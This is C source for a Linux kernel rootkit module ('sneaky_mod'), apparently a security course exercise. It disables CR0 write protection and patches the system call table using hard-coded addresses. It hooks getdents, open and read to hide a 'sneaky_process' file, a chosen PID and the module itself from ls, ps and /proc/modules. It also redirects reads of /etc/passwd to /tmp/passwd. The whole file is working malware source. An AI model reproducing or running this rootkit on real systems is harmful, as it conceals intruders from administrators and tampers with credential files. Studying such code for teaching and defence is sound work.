//boost module
#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>

#include <asm/unistd.h>

#include <asm/current.h>
#include <linux/sched.h>
#include <linux/highmem.h>

#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

#ifndef _ASM_X86_UNISTD_H
#define _ASM_X86_UNISTD_H

/* x32 syscall flag bit */
#define __X32_SYSCALL_BIT	0x40000000

# ifdef __i386__
#  include <asm/unistd_32.h>
# elif defined(__ILP32__)
#  include <asm/unistd_x32.h>
# else
#  include <asm/unistd_64.h>
# endif

#endif /* _ASM_X86_UNISTD_H */

#define TARGETADDR "/etc/passwd"
#define TEMPADDR "/tmp/passwd"

//by pass CR0 Protection
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.

#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

struct linux_dirent {
    u64 d_ino;//inode number
    s64 d_off;//offset
    unsigned short d_reclen;//length
    char d_name[];/* Filename (null-terminated) */
    /* length is actually (d_reclen - 2 -
       offsetof(struct linux_dirent, d_name)) */
};

//from system map to change read/write page permission for given addr
//vm type: 4.4.0-145-generic #171-Ubuntu
//cmd:  sudo cat /boot/System.map-`$(uname -r)` | grep -e set_pages_rw -e set_pages_ro -e sys_call_table
void (*pages_ro)(struct page *page, int numpages) = (void*)0xffffffff81071fc0;
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
unsigned long *syscall_table = (unsigned long*)0xffffffff81a00200;
int proc_opened=0,module_opened=0;
static char *mypid;
//if pass in string->charp
module_param(mypid, charp, 0);
//comment
MODULE_PARM_DESC(mypid, "mypid");


//getdents
//1.hide from 'ls' and 'find'
//2.hide '/proc/<sneky_pid>'
//ls /proc
//ps -a -u <s_pid>
//module_param()

//3. when cat /etc/passwd rtn /tmp/passwd
//open:1. proc->proc_opened
//  2. proc/modules->module_opened
//rm contents of the line in /proc/modules
// lsmod->no sneaky_mod
//read
//static inline void rootkit_hide(void) {
//    list_del(&THIS_MODULE->list);//lsmod,/proc/modules
//    kobject_del(&THIS_MODULE->mkobj.kobj);// /sys/modules
//    list_del(&THIS_MODULE->mkobj.kobj.entry);// kobj struct list_head entry
//}

asmlinkage int (*original_getdents)(unsigned int, const char __user *, size_t);

asmlinkage int new_getdents(unsigned int fd, const char __user *buf, size_t count) {

        int org_num =original_getdents(fd,buf,count);
        struct linux_dirent * dirent;
        int i=0;
        while (i < org_num){
          int found_flag = 0;
          dirent = (struct linux_dirent *) ((char *)buf + i); 
          //if found sneaky_process
          if ((strcmp(dirent->d_name,"sneaky_process")==0)||(strcmp(dirent->d_name,mypid)==0 && proc_opened==1)){
             found_flag =1;
          }
          if (found_flag){
             memcpy(dirent, (char*)dirent + dirent->d_reclen,org_num - (size_t)(((char*)dirent + dirent->d_reclen)- (char*)buf));
             org_num -= dirent->d_reclen;
             break;
          }
          i+=dirent->d_reclen;
        }   
        printk(KERN_ALERT "GETDENTS HIJACKED");
        return org_num; 

}

asmlinkage int (*original_open)(const char *pathname, int flags, mode_t mode);

asmlinkage int new_open(const char *pathname, int flags, mode_t mode) {

    printk(KERN_ALERT "OPEN HIJACKED");
    //if TARGETADDR opened
//copy_to_user(void __user *to, const void *from, unsigned
//long nbytes)
    if(strcmp(pathname,TARGETADDR)==0){
       if(!copy_to_user((void*)pathname,TEMPADDR,sizeof(TEMPADDR))){
           printk(KERN_ALERT "Cannot substitute");
       }
    }else if(strcmp(pathname,"/proc/modules")==0){
        module_opened=1;
        printk(KERN_INFO "Opened /n");
    }else if(strcmp(pathname,"/proc")==0){
        proc_opened=1;
    }

    int res = original_open(pathname, flags, mode);
    return res;

}

asmlinkage ssize_t (*original_read)(int fd, void *buf, size_t count);
asmlinkage ssize_t new_read(int fd, void *buf, size_t count){

    printk(KERN_ALERT "READ HIJACKED");
    ssize_t res = original_read(fd, buf, count);
    char* head = strstr(buf,"sneaky_mod");

    printk(KERN_INFO "module_opened %d /n", module_opened);
    printk(KERN_INFO "res %d /n", (int)res);

    if(module_opened==1 && res>0 && (head!=NULL)){
        //remove sneaky_mod
        char*tail = head;
        while(*tail!='\n'){
            ++tail;
        }
        res -= (ssize_t)(tail-1-head);
        ssize_t mv = (ssize_t)(res - (tail + 1 - (char*)buf));
        memmove(head, tail+1, mv);
        module_opened = 0;
        //0-head-1 tail+1-end
        printk(KERN_INFO "module_opened %d /n", module_opened);
        printk(KERN_INFO "res %d /n", (int)res);
    }
    return res;
}

static int init_sneaky_module(void)
{
    struct page *sys_call_page_temp;
    printk(KERN_INFO "Init sneaky module\n");

    /*now system table is read only,have to change permission*/
    // change into write mode
    write_cr0 (read_cr0 () & (~ 0x10000));

    //Bypass Kernel Write Protection
    sys_call_page_temp = virt_to_page(&syscall_table);
    pages_rw(sys_call_page_temp, 1);

    original_getdents = (void*)syscall_table[__NR_getdents];
    //original_getdents = (void*)*(syscall_table+__NR_getdents);
    syscall_table[__NR_getdents] = (unsigned long)new_getdents;

    original_open = (void*)syscall_table[__NR_open];
    syscall_table[__NR_open] = (unsigned long)new_open;

    original_read = (void*)syscall_table[__NR_read];
    syscall_table[__NR_read] = (unsigned long)new_read;


    //back to write protected mode
    pages_ro(sys_call_page_temp, 1);
    write_cr0 (read_cr0 () | 0x10000);
    //rootkit_hide();
    return 0;

}


static void exit_sneaky_module(void)
{
    struct page *sys_call_page_temp;
    printk(KERN_INFO "Exit sneaky module\n");

    /*now system table is read only,have to change permission*/
    // change into write mode
    write_cr0 (read_cr0 () & (~ 0x10000));

    //Bypass Kernel Write Protection
    sys_call_page_temp = virt_to_page(&syscall_table);
    pages_rw(sys_call_page_temp, 1);

    syscall_table[__NR_getdents] = (unsigned long) original_getdents;

    syscall_table[__NR_open] = (unsigned long)original_open;

    syscall_table[__NR_read] = (unsigned long)original_read;

    //back to write protected mode
    pages_ro(sys_call_page_temp, 1);
    write_cr0 (read_cr0 () | 0x10000);

}

module_init(init_sneaky_module);
module_exit(exit_sneaky_module);
MODULE_LICENSE("Dual MIT/GPL");
